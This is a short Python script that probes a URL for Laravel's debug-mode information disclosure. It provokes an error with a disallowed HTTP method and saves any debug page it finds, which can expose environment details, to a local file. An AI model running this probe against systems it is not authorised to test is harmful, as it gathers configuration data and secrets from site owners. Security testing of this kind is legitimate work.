#!/usr/bin/python3
"""
################################################################################
This script checks for Laravel's Information disclosure via Debug activated
################################################################################
"""

import sys
import requests

body_message = '<h2 class="details-heading">Environment &amp; details:</h2>'
methods = ["GET","HEAD","POST","PUT","PATCH","DELETE"]
url = str(sys.argv[1])

r = requests.options(url)
result = r.headers['Allow']

for x in methods:
  if x not in result:
    usable_method = methods[methods.index(x)].lower()
    print("Found usable HTTP Method")
    break
  pass

req = requests.request(usable_method, url)
if body_message in req.text:
  with open("response.html", "w") as f:
      f.write(req.text)
  print("File saved as response.html")
else:
  print("Not vulnerable")
